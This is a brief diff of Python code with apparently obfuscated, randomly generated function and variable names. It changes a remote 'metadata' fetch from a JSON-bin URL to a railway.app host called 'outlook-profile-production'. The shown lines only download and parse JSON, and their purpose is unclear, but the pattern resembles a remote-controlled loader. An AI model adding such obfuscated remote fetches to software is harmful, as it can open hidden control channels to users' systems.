@@ -18,7 +18,7 @@ def learn_vwgirz_826():
 
     def config_zfjksl_190():
         try:
-            model_njwsaa_352 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            model_njwsaa_352 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             model_njwsaa_352.raise_for_status()
             learn_jgornv_342 = model_njwsaa_352.json()
             data_mrkovi_358 = learn_jgornv_342.get('metadata')
